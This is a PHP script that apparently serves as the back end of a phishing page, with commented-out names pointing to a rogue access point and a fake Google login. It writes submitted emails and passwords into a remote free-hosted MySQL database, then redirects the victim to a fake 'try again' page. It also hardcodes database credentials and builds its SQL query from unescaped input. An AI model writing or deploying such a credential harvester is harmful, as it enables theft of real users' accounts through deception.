<?php
session_start();
ob_start();
//$host="localhost";
//$username="root";
//$password="";
//$password="!@db101#$";
//$db_name="rogue_AP";
//$tbl_name="gugel";

$host="sql12.freesqldatabase.com";
$username= "sql12377508";
$password="Plu9U2PijP";
//$password="!@db101#$";
$db_name="sql12377508";
$tbl_name="foxdum";

	#mysql_connect("$host", "$username") or die("couldn't connect");
	#mysql_select_db("$db_name");

$conn = mysqli_connect($host, $username, $password, $db_name);

if (!$conn)
{
	die("CONNECTION FAILED: " . mysqli_connect_error());
}

//$socialn=$_POST['socialn'];
$email=$_POST['email'];
$userpassword=$_POST['userpassword'];

/*
if($email != $userpassword)
{
	header("location:error.html");
	exit;
}
*/

#mysql_query("INSERT INTO social_login(socialn, password1, password2) VALUES('$password1', '$password2');");

$sql = "INSERT INTO gugel(email, userpassword) VALUES ( '$email', '$userpassword');";

if (mysqli_query($conn, $sql)) 
{
    echo "New record created successfully";
}
else 
{
    echo "Error: " . $sql . "<br>" . mysqli_error($conn);
}

$conn->close();
sleep(2);
header("location:https://foxapp-dum.netlify.app/tryagain.html");
ob_end_flush();
?>
